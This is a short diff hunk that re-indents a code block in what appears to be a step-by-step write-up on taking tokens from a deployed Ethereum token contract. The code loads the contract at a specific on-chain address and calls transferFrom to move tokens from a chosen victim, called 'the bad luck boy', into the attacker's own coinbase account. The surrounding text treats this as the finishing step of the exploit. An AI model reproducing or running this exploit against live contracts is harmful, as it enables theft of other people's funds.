@@ -27,10 +27,10 @@ seek a bad luck boy
 
 # 0x03
 
-  # add abi
-  abi = {edu_abi} # replace with edu abi
-  edu_contract = web3.eth.contract(abi).at('0xa0872eE815B8dd0F6937386Fd77134720d953581')
-  edu_contract.transferFrom('the bad luck boy', eth.coinbase, 10, {'from': eth.coinbase})
+    # add abi
+    abi = {edu_abi} # replace with edu abi
+    edu_contract = web3.eth.contract(abi).at('0xa0872eE815B8dd0F6937386Fd77134720d953581')
+    edu_contract.transferFrom('the bad luck boy', eth.coinbase, 10, {'from': eth.coinbase})
   
 # 0x04
  here we finished, at last, dont be evil :)
